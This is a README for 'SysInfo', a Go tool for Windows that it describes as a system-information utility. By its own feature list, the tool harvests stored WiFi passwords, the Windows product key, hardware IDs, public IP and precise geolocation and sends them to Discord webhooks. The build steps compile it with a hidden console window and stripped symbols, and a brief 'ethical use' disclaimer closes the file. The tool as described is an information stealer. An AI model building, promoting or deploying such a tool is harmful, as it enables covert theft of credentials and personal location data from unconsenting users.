# SysInfo

SysInfo is a lightweight and efficient system information tool that gathers detailed hardware, network, and system information from Windows devices and sends it to configured Discord webhooks. This tool is ideal for monitoring, debugging, and analyzing system configurations.

---

## Features

SysInfo collects the following types of information:

### User Information
- **Username**: Retrieves the current user's Windows username.
- **Hostname**: Captures the computer's hostname.


### System Information
- **Operating System (OS)**: Identifies the installed Windows operating system.
- **CPU**: Retrieves the processor name and details.
- **GPU**: Detects the graphics card information.
- **RAM**: Reports the total installed memory (in GB).
- **MAC Address**: Extracts the system's MAC address.
- **Hardware ID (HWID)**: Captures the unique hardware ID of the machine.
- **Windows Product Key**: Retrieves the product key of the Windows installation.


### Disk Information
- Lists all available disks with:
  - **Drive Letter** (e.g., `C:`)
  - **Free Space** (in GB)
  - **Total Space** (in GB)
  - **Usage Percentage**


### Network Information
- **Public IP Address**: Captures the machine's public IP address.
- **Geolocation**: Fetches country, region, city, postal code, and ISP.
- **Latitude & Longitude**: Retrieves geographic coordinates.
- **ISP Information**: Identifies the internet service provider.


### WiFi Information
- Lists all stored WiFi networks along with their passwords (if accessible).

---


## Prerequisites


To run SysInfo, ensure the following prerequisites are met:
1. **Windows OS**: The tool is designed specifically for Windows platforms.
2. **Go Programming Language**: Install [Go](https://golang.org/dl/) to build and run the project.
3. **Git**: Required for cloning the repository.

---


### How to Build

1. Clone the repository:
   ```
   git clone https://github.com/SAKIB-SALIM/SysInfo.git
   cd SysInfo
   ```

2. Configure your Discord webhooks in webhooks/webhooks.go:


3. Install dependencies:
   ```
   go mod tidy
   ```

4. Build the executable:
   ```
   go build -ldflags="-s -w -H=windowsgui" -o SysInfo.exe
   ```

---

### Disclaimer

    This tool is designed for ethical use only. Ensure you have proper authorization before deploying it. Misuse of this tool may violate privacy laws or terms of service.
